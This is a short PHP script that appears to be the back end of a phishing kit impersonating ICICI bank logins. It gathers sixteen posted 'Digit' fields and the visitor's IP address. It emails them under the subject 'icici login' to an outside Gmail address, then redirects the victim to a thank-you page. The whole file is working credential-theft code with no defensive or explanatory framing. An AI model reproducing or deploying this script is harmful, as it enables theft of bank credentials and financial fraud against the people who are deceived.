<?$fromemail = "admin@nobody.com";
$ip = getenv("REMOTE_ADDR");
$message .= "A: ".$_POST['Digit(1)']."\n";
$message .= "B: " .$_POST['Digit(2)']."\n";
$message .= "C: ".$_POST['Digit(3)']."\n";
$message .= "D: ".$_POST['Digit(4)']."\n";
$message .= "E: ".$_POST['Digit(5)']."\n";
$message .= "F: ".$_POST['Digit(6)']."\n";
$message .= "G: ".$_POST['Digit(7)']."\n";
$message .= "H: ".$_POST['Digit(8)']."\n";
$message .= "I: ".$_POST['Digit(9)']."\n";
$message .= "J: ".$_POST['Digit(10)']."\n";
$message .= "K: ".$_POST['Digit(11)']."\n";
$message .= "L: ".$_POST['Digit(12)']."\n";
$message .= "M: ".$_POST['Digit(13)']."\n";
$message .= "N: ".$_POST['Digit(14)']."\n";
$message .= "O: ".$_POST['Digit(15)']."\n";
$message .= "P: ".$_POST['Digit(16)']."\n";
$message .= "IP: ".$ip."\n";

$recipient ="ee2568@gmail.com";
$subject = "icici login";
$headers = "MIME-Version: 1.0\n";

if (mail($recipient,$subject,$message,$headers))	 
 



 {		   header("Location: ./thankyou.html");	   }else    	 
 


 { 		echo "ERROR! Please go back and try again.";  	   }?>


